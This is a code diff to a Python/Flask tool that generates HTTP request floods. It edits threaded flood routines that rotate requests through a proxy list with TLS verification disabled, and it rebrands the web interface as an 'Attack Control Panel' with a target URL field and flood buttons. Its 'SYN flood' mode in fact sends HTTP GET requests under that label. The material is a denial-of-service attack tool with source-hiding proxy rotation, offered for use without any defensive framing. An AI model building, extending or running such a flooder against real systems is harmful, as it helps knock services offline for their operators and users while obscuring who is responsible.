@@ -90,7 +90,6 @@ class TrafficGenerator:
     def _send_request(self, session):
         url = self.target_url + random.choice(URL_PATHS)
 
-        # FAST: per-request proxy rotation
         proxy = None
         if PROXY_LIST:
             p = random.choice(PROXY_LIST)
@@ -100,7 +99,7 @@ class TrafficGenerator:
             requests.get(
                 url,
                 headers=random_headers(),
-                timeout=0.6,                 # ultra-low timeout (MAJOR PPS BOOST)
+                timeout=0.6,
                 proxies=proxy,
                 verify=False,
                 allow_redirects=False
@@ -110,7 +109,6 @@ class TrafficGenerator:
 
         self._inc()
 
-    # --------------------- NORMAL ---------------------
     def generate_normal(self, duration=30, rate=5):
         self.running = True
         self.sent = 0
@@ -128,7 +126,6 @@ class TrafficGenerator:
         self.running = False
         self.last_finished_at = time.time()
 
-    # --------------------- HTTP FLOOD ---------------------
     def generate_http_flood(self, duration=20, rate=1000, threads_count=30):
         self.running = True
         self.sent = 0
@@ -160,7 +157,6 @@ class TrafficGenerator:
 
         self.last_finished_at = time.time()
 
-    # --------------------- SYN FLOOD ---------------------
     def generate_syn_flood(self, duration=20, bursts=50):
         self.running = True
         self.sent = 0
@@ -173,17 +169,13 @@ class TrafficGenerator:
             if not self.running:
                 break
 
-            for _ in range(200):  # 200 threads per burst
+            for _ in range(200):  
                 threading.Thread(target=self._send_request, args=(session,), daemon=True).start()
 
             time.sleep(0.01)
 
         self.running = False
         self.last_finished_at = time.time()
-
-    # =======================================================
-    # START / STOP / STATUS
-    # =======================================================
 
     def start_scenario(self, name, **kw):
         if self._worker and self._worker.is_alive():
@@ -235,7 +227,6 @@ class TrafficGenerator:
             "last_finished_at": self.last_finished_at
         }
 
-
 # =======================================================
 # FLASK SERVER
 # =======================================================
@@ -268,45 +259,107 @@ def api_status():
 
 
 # =======================================================
-# SIMPLE UI
+# TERMINAL HACKING UI
 # =======================================================
 
 HTML_PAGE = """
 <!doctype html>
 <html>
 <head>
-<title>Traffic Loader</title>
+<title>Attack Control Panel</title>
 <style>
-body{font-family:Arial;background:#eee;padding:20px;}
-input{padding:8px;width:260px;}
-button{padding:10px 20px;margin:4px;}
-pre{background:white;padding:15px;border-radius:6px;}
+body{
+    background:black;
+    color:#00ff41;
+    font-family: Consolas, monospace;
+    margin:0;
+    padding:20px;
+}
+.container{
+    max-width:900px;
+    margin:auto;
+}
+input, select{
+    width:280px;
+    padding:6px;
+    background:#000;
+    border:1px solid #00ff41;
+    color:#00ff41;
+    margin-bottom:10px;
+}
+button{
+    padding:10px 18px;
+    margin:5px;
+    background:black;
+    border:1px solid #00ff41;
+    color:#00ff41;
+    cursor:pointer;
+    font-size:14px;
+    transition:0.25s;
+}
+button:hover{
+    background:#00ff41;
+    color:black;
+}
+#status{
+    background:black;
+    border:1px solid #00ff41;
+    padding:12px;
+    height:230px;
+    overflow:auto;
+    margin-top:10px;
+    font-size:14px;
+    color:#a2ff95;
+}
+.header{
+    font-size:22px;
+    border-left:4px solid #00ff41;
+    padding-left:12px;
+    margin-bottom:10px;
+}
+.divider{
+    width:100%;
+    height:1px;
+    background:#00ff41;
+    margin:15px 0;
+}
+.blink{
+    animation: blink 1s infinite;
+}
+@keyframes blink{
+    0%,100%{opacity:0;}
+    50%{opacity:1;}
+}
 </style>
 </head>
+
 <body>
+<div class="container">
+    <div class="header">ATTACK CONTROL PANEL <span class="blink">_</span></div>
 
-<h2>Traffic Loader Control Panel</h2>
+    <label>Target URL:</label><br>
+    <input id="target" value="http://localhost:8000"><br>
 
-<label>Target URL:</label><br>
-<input id="target" value="http://localhost:8000"><br><br>
+    <label>Duration (seconds):</label><br>
+    <input id="duration" value="30"><br>
 
-<label>Duration:</label><br>
-<input id="duration" value="30"><br><br>
+    <label>Rate (pps):</label><br>
+    <input id="rate" value="1000"><br>
 
-<label>Rate:</label><br>
-<input id="rate" value="1000"><br><br>
+    <label>Threads:</label><br>
+    <input id="threads" value="30"><br>
 
-<label>Threads:</label><br>
-<input id="threads" value="30"><br><br>
+    <div class="divider"></div>
+    
+    <button onclick="start('normal')">NORMAL MODE</button>
+    <button onclick="start('http_flood')">HTTP FLOOD</button>
+    <button onclick="stopAttack()" style="border-color:#ff3b3b;color:#ff3b3b;">STOP</button>
 
-<button onclick="start('normal')">Normal</button>
-<button onclick="start('http_flood')" style="background:#ff6961">HTTP Flood</button>
-<button onclick="start('syn_flood')" style="background:#ffd500">SYN Flood</button>
-<button onclick="start('mixed')" style="background:#9999ff">Mixed</button>
-<button onclick="stopAttack()" style="background:black;color:white">STOP</button>
+    <div class="divider"></div>
 
-<h3>Status</h3>
-<pre id="status">Loading...</pre>
+    <h3>Status</h3>
+    <pre id="status">Awaiting action...</pre>
+</div>
 
 <script>
 async function start(type){
@@ -317,7 +370,7 @@ async function start(type){
         rate:parseInt(document.getElementById("rate").value),
         threads_count:parseInt(document.getElementById("threads").value)
     };
-    await fetch("/api/start", {
+    await fetch("/api/start",{
         method:"POST",
         headers:{"Content-Type":"application/json"},
         body:JSON.stringify(payload)
@@ -331,13 +384,11 @@ async function stopAttack(){
 async function refresh(){
     let r = await fetch("/api/status");
     document.getElementById("status").textContent =
-        JSON.stringify(await r.json(),null,2);
+    JSON.stringify(await r.json(),null,2);
 }
-
-setInterval(refresh,1500);
+setInterval(refresh,1200);
 refresh();
 </script>
-
 </body>
 </html>
 """
